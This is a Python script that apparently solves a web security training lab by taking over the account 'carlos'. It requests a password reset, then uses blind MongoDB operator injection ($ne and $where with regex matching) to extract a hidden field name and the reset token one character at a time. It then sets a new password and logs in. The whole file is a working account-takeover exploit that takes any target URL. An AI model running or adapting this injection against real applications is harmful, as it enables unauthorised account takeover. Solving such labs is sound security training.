import warnings
import sys
import requests
import urllib.parse
import urllib3
import time
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
reset_path = burp_url + '/forgot-password'
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 '

def get_csrf_token(r):
    soup = BeautifulSoup(r.content, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    return csrf_input['value']

def send_reset_password_request(s, url):
    r = s.get(reset_path)
    csrf_token = get_csrf_token(r)
    reset_data = {
        "csrf": csrf_token,
        "username": "carlos"
    }
    s.post(reset_path, data=reset_data)

def find_json_parameter(s, url):
    parameter = ''
    for i in range(20):
        for char in CHARS:
            sys.stdout.write('\rJSON parameter: ' + parameter + char)
            payload = {"username": "carlos", "password": {"$ne":"invalid"}, "$where":f"Object.keys(this)[3].match('^.{{{str(i)}}}{char}.*')"}
            r = s.post(login_url, json=payload)
            if 'Account locked: please reset your password' in r.text:
                parameter += char
                break
            sys.stdout.flush()
            if char == ' ':
                return parameter

def get_reset_token(s, url, parameter):
    token = ''
    for i in range(20):
        for char in CHARS:
            sys.stdout.write('\rReset token: ' + token + char)
            payload = {"username": "carlos", "password": {"$ne":"invalid"}, "$where":f"this.{parameter}.match('^.{{{str(i)}}}{char}.*')"}
            r = s.post(login_url, json=payload)
            if 'Account locked: please reset your password' in r.text:
                token += char
                break
            sys.stdout.flush()
            if char == ' ':
                return token

def change_password(s, url, parameter, token):
    reset_full_path = url + '/forgot-password?' + parameter + '=' + token
    r = s.get(reset_full_path)
    time.sleep(1)
    csrf_token = get_csrf_token(r)
    reset_data = {
        "csrf": csrf_token,
        "new-password-1": "password123",
        "new-password-2": "password123",
        parameter: token
    }
    r = s.post(reset_full_path, data=reset_data, allow_redirects=False)
    return r.status_code == 302

def connect_as_carlos(s, url):
    login_data = {
        "username": "carlos",
        "password": "password123"
    }
    s.post(login_url, json=login_data)

def show_usage():
    print('[+] Usage: %s <URL>' % sys.argv[0])
    print('[+] Example: %s https://www.target.com' % sys.argv[0])
    sys.exit(-1)

def main():
    try:
        url = sys.argv[1].strip()
    except IndexError:
        show_usage()
    s = requests.Session()
    s.verify = False
    r = s.get(url, allow_redirects=False)
    time.sleep(1)
    if '<h1>Error</h1>' not in r.text and 'Server Error: Gateway Timeout' not in r.text:
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc
        url = parsed_url.scheme + '://' + host
        time.sleep(1)

        send_reset_password_request(s, url)
        parameter = find_json_parameter(s, url)
        token = get_reset_token(s, url, parameter)
        if change_password(s, url, parameter, token):
            connect_as_carlos(s, url)

        s.cookies.clear()
        time.sleep(2)
        r = s.get(url)
        if 'Congratulations, you solved the lab!' in r.text:
            print('\n[+] The lab is solved !')
    else:
        print('\n[-] HOST seems to be down <!>')

if __name__ == "__main__":
    main()
